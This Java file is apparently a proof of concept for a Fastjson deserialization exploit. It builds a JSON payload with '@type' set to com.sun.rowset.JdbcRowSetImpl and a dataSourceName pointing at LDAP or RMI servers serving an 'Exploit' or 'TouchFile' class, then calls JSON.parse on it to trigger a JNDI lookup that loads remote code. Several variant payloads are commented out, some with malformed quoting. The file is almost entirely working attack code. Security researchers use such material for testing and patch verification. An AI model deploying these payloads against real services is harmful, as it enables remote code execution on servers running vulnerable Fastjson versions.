package 版本24;

import com.alibaba.fastjson.JSON;
import com.fastjson.User;

import java.io.IOException;

public class POC {

    public static void main(String[] argv) throws IOException {
        String payload =   "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://127.0.0.1:1389/Exploit\",\"autoCommit\":true}";
//        String payload = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhost:1099/Exploit\",\"\"autoCommit\":true}";
//        String payload = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://127.0.0.1:1389/TouchFile\",\"\"autoCommit\":true}";
//        String payload = "{\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://127.0.0.1:1099/TouchFile\",\"autoCommit\":true}}";
//        String payload = "{\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://127.0.0.1:1389/TouchFile\",\"autoCommit\":true}}";
        JSON.parse(payload);
//        JSON.parseObject(payload,User.class);
    }

}